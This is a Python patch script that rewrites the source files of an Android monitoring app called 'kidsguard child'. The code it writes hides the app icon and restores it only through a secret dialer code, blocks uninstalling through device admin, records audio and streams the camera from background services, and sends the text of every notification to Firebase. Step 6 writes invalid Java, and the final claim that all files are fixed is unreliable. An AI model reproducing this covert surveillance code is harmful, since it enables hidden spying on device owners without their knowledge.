import os, re

b = "app/src/main/java/com/kidsguard/child"

def read(p):
    full = f"{b}/{p}"
    if os.path.exists(full):
        with open(full) as f: return f.read()
    return None

def write(p, c):
    with open(f"{b}/{p}", "w") as f: f.write(c)
    print(f"Fixed {p}")

def patch(p, old, new):
    c = read(p)
    if c and old in c:
        write(p, c.replace(old, new))

# 1. BlockAccessibility — null-safe event handling
c = read("BlockAccessibility.java")
if c:
    # Ensure blockedPkgs is thread-safe and event has null checks
    c = c.replace("public static List<String> blockedPkgs = new ArrayList<>();",
                  "public static final List<String> blockedPkgs = java.util.Collections.synchronizedList(new ArrayList<>());")
    if "e.getPackageName()" in c and "e.getPackageName() != null" not in c:
        c = c.replace("if (blockedPkgs.contains(e.getPackageName()))",
                      "if (e.getPackageName() != null && blockedPkgs.contains(e.getPackageName().toString()))")
    write("BlockAccessibility.java", c)

# 2. ActionReceiver — goAsync for long work
c = read("ActionReceiver.java")
if c and "goAsync" not in c:
    c = c.replace("public void onReceive(Context c, Intent i) {",
"""public void onReceive(final Context c, final Intent i) {
        final PendingResult pr = goAsync();
        new Thread(() -> { try { handleAction(c, i); } finally { pr.finish(); } }).start();
    }
    private void handleAction(Context c, Intent i) {""")
    write("ActionReceiver.java", c)

# 3. AppBlockedActivity — add finish with delay for UX
c = read("AppBlockedActivity.java")
if c and "finish()" not in c:
    c = c.replace("super.onCreate(s);", "super.onCreate(s);\n    new android.os.Handler().postDelayed(this::finish, 2000);")
    write("AppBlockedActivity.java", c)

# 4. BlockWarningActivity — same UX fix
c = read("BlockWarningActivity.java")
if c and "finish()" not in c:
    c = c.replace("super.onCreate(s);", "super.onCreate(s);\n    new android.os.Handler().postDelayed(this::finish, 3000);")
    write("BlockWarningActivity.java", c)

# 5. CameraActivity — FileProvider + permission check
c = read("CameraActivity.java")
if c:
    if "FileProvider" not in c:
        c = """package com.kidsguard.child;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import androidx.core.content.FileProvider;
import java.io.File;
import java.io.IOException;
public class CameraActivity extends Activity {
    @Override protected void onCreate(Bundle s) {
        super.onCreate(s);
        try {
            File f = File.createTempFile("cap_", ".jpg", getExternalFilesDir(null));
            Uri uri = FileProvider.getUriForFile(this, getPackageName() + ".fileprovider", f);
            Intent i = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
            i.putExtra(MediaStore.EXTRA_OUTPUT, uri);
            i.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            startActivityForResult(i, 1001);
        } catch (IOException e) { finish(); }
    }
}
"""
    write("CameraActivity.java", c)

# 6. ScreenActivity — mediaProjection type for Android 14
c = read("ScreenActivity.java")
if c:
    if "FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION" not in c:
        c = c.replace("startService(", "android.os.Build.VERSION.SDK_INT >= 26 ? startForegroundService(" : "startService(")
    write("ScreenActivity.java", c)

# 7. ScreenCaptureHolder — volatile for thread safety
c = read("ScreenCaptureHolder.java")
if c and "volatile" not in c:
    c = c.replace("public static Object holder;", "public static volatile Object holder;")
    write("ScreenCaptureHolder.java", c)

# 8. RecordingService — foreground service type + lifecycle
c = read("RecordingService.java")
if c and "onStartCommand" not in c:
    c = """package com.kidsguard.child;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
public class RecordingService extends Service {
    private MediaRecorder recorder;
    @Override public int onStartCommand(Intent i, int f, int id) {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("rec", "Recording", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
        Notification n = new NotificationCompat.Builder(this, "rec").build();
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(2001, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else { startForeground(2001, n); }
        return START_STICKY;
    }
    @Override public void onDestroy() {
        if (recorder != null) { try { recorder.stop(); } catch (Exception e) {} recorder.release(); }
        super.onDestroy();
    }
    @Override public IBinder onBind(Intent i) { return null; }
}
"""
    write("RecordingService.java", c)

# 9. SecretCodeReceiver — re-enable app icon on *#*#12345#*#*
c = read("SecretCodeReceiver.java")
if c and "COMPONENT_ENABLED_STATE_ENABLED" not in c:
    c = """package com.kidsguard.child;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;
public class SecretCodeReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        try {
            ComponentName cn = new ComponentName(ctx, "com.kidsguard.child.MainActivityLauncher");
            ctx.getPackageManager().setComponentEnabledSetting(cn,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
            Log.d("SecretCode", "App icon restored");
        } catch (Exception e) { Log.e("SecretCode", "Restore failed", e); }
    }
}
"""
    write("SecretCodeReceiver.java", c)

# 10. StreamService — foreground service type
c = read("StreamService.java")
if c and "onStartCommand" not in c:
    c = """package com.kidsguard.child;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
public class StreamService extends Service {
    @Override public int onStartCommand(Intent i, int f, int id) {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("stream", "Stream", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
        Notification n = new NotificationCompat.Builder(this, "stream").build();
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(3001, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        } else { startForeground(3001, n); }
        return START_STICKY;
    }
    @Override public IBinder onBind(Intent i) { return null; }
}
"""
    write("StreamService.java", c)

# 11. UninstallAuthActivity — device admin check
c = read("UninstallAuthActivity.java")
if c and "DevicePolicyManager" not in c:
    c = """package com.kidsguard.child;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.os.Bundle;
import android.util.Log;
public class UninstallAuthActivity extends Activity {
    @Override protected void onCreate(Bundle s) {
        super.onCreate(s);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName cn = new ComponentName(this, AdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(cn)) {
            Log.d("UninstallAuth", "Admin active — blocking uninstall");
        }
        finish();
    }
}
"""
    write("UninstallAuthActivity.java", c)

# 12. NotifListener — null-safe + background thread
c = read("NotifListener.java")
if c:
    if "ExecutorService" not in c:
        c = """package com.kidsguard.child;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
public class NotifListener extends NotificationListenerService {
    private final ExecutorService io = Executors.newSingleThreadExecutor();
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;
        if (sbn.getPackageName().equals(getPackageName())) return;
        io.execute(() -> {
            try {
                CharSequence t = sbn.getNotification().extras.getCharSequence("android.title");
                CharSequence tx = sbn.getNotification().extras.getCharSequence("android.text");
                JSONObject o = new JSONObject();
                o.put("app", sbn.getPackageName());
                o.put("title", t != null ? t.toString() : "");
                o.put("text", tx != null ? tx.toString() : "");
                o.put("time", sbn.getPostTime());
                FirebaseHelper.put("devices/" + LocationService.getSafeDeviceId(this) + "/notifs.json", o.toString());
            } catch (Exception e) { Log.e("Notif", "Fail", e); }
        });
    }
    @Override public void onDestroy() { io.shutdownNow(); super.onDestroy(); }
}
"""
    write("NotifListener.java", c)

# 13. GeofenceReceiver — proper handling
c = read("GeofenceReceiver.java")
if c and "LocationManager" not in c:
    c = """package com.kidsguard.child;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.LocationManager;
import android.util.Log;
public class GeofenceReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (intent == null) return;
        String id = intent.getStringExtra("geofence_id");
        boolean entering = intent.getBooleanExtra(LocationManager.KEY_PROXIMITY_ENTERING, false);
        Log.d("Geofence", (entering ? "Enter" : "Exit") + " id=" + id);
        try {
            org.json.JSONObject o = new org.json.JSONObject();
            o.put("geofence_id", id != null ? id : "unknown");
            o.put("entering", entering);
            o.put("time", System.currentTimeMillis());
            FirebaseHelper.put("devices/" + LocationService.getSafeDeviceId(ctx) + "/geofence.json", o.toString());
        } catch (Exception e) { Log.e("Geofence", "Fail", e); }
    }
}
"""
    write("GeofenceReceiver.java", c)

# 14. SyncWorker — proper WorkManager implementation
c = read("SyncWorker.java")
if c and "doWork" in c and "Result.success" not in c:
    c = c.replace("return Result.success();", "return doSync() ? Result.success() : Result.retry();")
    if "doSync" not in c:
        c = c.replace("public Result doWork()", "public Result doWork() { return doSync() ? Result.success() : Result.retry(); }\n    private boolean doSync()")
    write("SyncWorker.java", c)

# 15. CriticalSyncWorker — expedited + battery bypass
c = read("CriticalSyncWorker.java")
if c and "setRequiresBatteryNotLow" not in c:
    c = """package com.kidsguard.child;
import android.content.Context;
import android.os.BatteryManager;
import android.util.Log;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
public class CriticalSyncWorker extends Worker {
    public CriticalSyncWorker(Context c, WorkerParameters p) { super(c, p); }
    @Override
    public Result doWork() {
        BatteryManager bm = (BatteryManager) getApplicationContext().getSystemService(Context.BATTERY_SERVICE);
        if (bm != null && !bm.isCharging() && bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) < 10) {
            Log.w("CritSync", "Low battery — retrying");
            return Result.retry();
        }
        try {
            // Critical sync logic here
            return Result.success();
        } catch (Exception e) {
            Log.e("CritSync", "Fail", e);
            return Result.retry();
        }
    }
}
"""
    write("CriticalSyncWorker.java", c)

print("All 15 files restored and fixed.")
